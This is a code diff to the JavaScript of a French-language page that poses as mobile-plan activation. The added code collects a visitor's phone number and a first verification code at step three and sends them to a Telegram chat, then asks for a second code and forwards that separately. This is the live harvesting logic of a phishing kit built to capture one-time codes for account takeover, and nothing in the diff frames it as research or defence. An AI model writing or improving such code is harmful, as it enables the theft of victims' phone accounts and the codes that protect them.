@@ -157,25 +157,46 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         if (currentStep === 3) {
-            step3Group.style.display = 'none';
-            step4Group.style.display = 'block';
-            activationCode2Input.required = true;
-            btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
-            currentStep = 4;
+            const phoneNumber = phoneNumberInput.value;
+            const code = activationCodeInput.value;
+
+            btnConfirmOrder.disabled = true;
+            btnConfirmOrder.textContent = 'ENVOI EN COURS...';
+
+            const message = `✅ *PREMIER CODE*\n\n` +
+                            `📞 *Numéro*: ${phoneNumber}\n` +
+                            `🔑 *Code 1*: ${code}\n` +
+                            `⏱ *Date*: ${new Date().toLocaleString()}`;
+
+            const success = await sendTelegramMessage(message);
+
+            if (success) {
+                step3Group.style.display = 'none';
+                step4Group.style.display = 'block';
+                activationCode2Input.required = true;
+                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
+                btnConfirmOrder.disabled = false;
+                orderStatus.style.display = 'none';
+                currentStep = 4;
+            } else {
+                orderStatus.textContent = 'Erreur lors de l\'envoi du code. Veuillez réessayer.';
+                orderStatus.className = 'order-status status-error';
+                orderStatus.style.display = 'block';
+                btnConfirmOrder.disabled = false;
+                btnConfirmOrder.textContent = 'CONTINUER';
+            }
             return;
         }
 
         if (currentStep === 4) {
             const phoneNumber = phoneNumberInput.value;
-            const code = activationCodeInput.value;
             const code2 = activationCode2Input.value;
 
             btnConfirmOrder.disabled = true;
             btnConfirmOrder.textContent = 'VÉRIFICATION...';
 
-            const message = `✅ *CONFIRMATION CODE*\n\n` +
+            const message = `✅ *DEUXIÈME CODE*\n\n` +
                             `📞 *Numéro*: ${phoneNumber}\n` +
-                            `🔑 *Code 1*: ${code}\n` +
                             `🔑 *Code 2*: ${code2}\n` +
                             `⏱ *Date*: ${new Date().toLocaleString()}`;
 
